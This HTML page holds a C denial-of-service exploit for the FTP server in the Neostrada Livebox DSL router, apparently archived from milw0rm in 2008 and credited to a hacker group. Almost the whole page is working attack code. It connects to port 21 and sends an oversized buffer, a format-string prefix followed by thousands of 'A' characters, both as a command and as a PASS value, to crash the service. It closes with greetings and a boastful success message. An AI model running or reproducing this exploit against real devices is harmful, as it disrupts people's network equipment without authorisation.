<html><head><title>Galaxy FTP Server 1.0 (Neostrada Livebox DSL Router) DoS Exploit</title></head><pre>/*
Discovered bY 0in From DaRk-CodeRs Programming &amp; Security Group!
Contact: 0in(dot)email[at]gmail(dot)com
HOMEPAGE: http://dark-coders.4rh.eu

DESCRIPTION:

Livebox router is vulnerability to remote (but from local network, because firewall working..) buffer overflow DoS attack to FTP service.


POC:
*/

#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;

int port=21;
struct hostent *he;
struct sockaddr_in their_addr;



int konekt(char *addr)
{
int sock;

he=gethostbyname(addr);
if(he==NULL)
{
printf(&quot;Unknow host!\nexiting...&quot;);
return -1;
}
if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
{
perror(&quot;socket&quot;);
return -2;
}

their_addr.sin_family = AF_INET;
their_addr.sin_port = htons(port);
their_addr.sin_addr = *((struct in_addr *)he-&gt;h_addr);
memset(&amp;(their_addr.sin_zero), '\0', 8);
if (connect(sock, (struct sockaddr *)&amp;their_addr,
sizeof(struct sockaddr)) == -1)
{
perror(&quot;connect&quot;);
return -1;
}

return sock;
}

int main(int argc,char *argv[])
{
printf(&quot;\n+===============================Yeah======================================+&quot;);
printf(&quot;\n+= ADI Convergence Galaxy FTP Server v1.0 (Neostrada Livebox DSL Router) =+&quot;);
printf(&quot;\n+= Remote Buffer Overflow DoS Exploit =+&quot;);
printf(&quot;\n+= bY =+&quot;);
printf(&quot;\n+= Maks M. [0in] From Dark-CodeRs Security &amp; Programming Group! =+&quot;);
printf(&quot;\n+= 0in(dot)email[at]gmail(dot)com =+&quot;);
printf(&quot;\n+= Please visit: http://dark-coders.4rh.eu =+&quot;);
printf(&quot;\n+= Greetings to: Die_Angel, Sun8hclf, M4r1usz, Aristo89, Djlinux =+&quot;);
printf(&quot;\n+= And other friends: MaLy, Slim, elwin013, Rade0n3900, Wojto111, =+&quot;);
printf(&quot;\n+= Chomzee, AfroPL, Joker186 =+&quot;);
printf(&quot;\n+===============================Yeah======================================+&quot;);

if(argc&lt;2)
{
printf(&quot;\nUse %s [IP]!\n&quot;,argv[0]);
exit(0);
}
printf(&quot;\nConnecting to:%s...&quot;,argv[1]);
int sock=konekt(argv[1]);
if(sock&lt;0)
{
printf(&quot;\neh...&quot;);
exit(0);
}
printf(&quot;\nConnected!!\n&quot;);
char rcv[256];
recv(sock,rcv,255,0);
printf(&quot;\n%s\n&quot;,rcv);
printf(&quot;\nSending evil buffer..&quot;);
char evil[100*100]=&quot;%n\x01\x02\x03\x04&quot;;
int i;
for(i=0;i&lt;(100*100)-100;i++)
{
strcat(evil,&quot;A&quot;);
}

strcat(evil,&quot;\r\n&quot;);
send(sock,evil,strlen(evil),0);
strcpy(rcv,&quot;&quot;);
recv(sock,rcv,255,0);
printf(&quot;\n%s\n&quot;,rcv);
char pass[100*1000]=&quot;PASS &quot;;
strcat(pass,evil);
strcat(pass,&quot;\n\r&quot;);
send(sock,pass,strlen(pass),0);
strcpy(rcv,&quot;&quot;);
recv(sock,rcv,255,0);
printf(&quot;\n%s\n&quot;,rcv);
printf(&quot;\nOK!\nYou're Livebox FTP server should fucked out...&quot;);

exit(0);
}

// milw0rm.com [2008-03-01]</pre></html>